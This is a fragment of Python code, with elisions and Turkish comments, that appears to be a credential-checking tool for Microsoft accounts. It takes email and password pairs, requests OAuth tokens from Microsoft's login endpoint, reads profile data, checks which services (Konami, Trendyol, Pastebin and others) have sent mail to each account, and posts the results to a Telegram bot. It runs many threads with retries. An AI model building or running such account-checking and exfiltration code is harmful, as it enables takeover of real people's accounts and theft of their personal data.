...
services = {
    ...
    "Konami": ["support@konami.com"],
    "PES": ["no-reply@konami.net"],
    "Pastebin": ["noreply@pastebin.com"],
    "Yemeksepeti": ["info@yemeksepeti.com"],
    "Trendyol": ["musterihizmetleri@trendyol.com", "guvenlik@trendyol.com"]
}
...
def get_infoo(Email, Password, token, CID):
    ...
    try:
        ...
        r = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he)
        ...
        rese = session.post(url, headers=headers, data="").text
...
Bağlantılar:"""
        ...
        try:
            session.post(f"https://api.telegram.org/bot{Tok}/sendMessage", data={"chat_id": id, "text": result})
...
def get_token(Email, Password, cook, hh):
    try:
        ...
        response = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=data)
...
# ✅ max_workers 15 + retry ayarlı çalıştırma
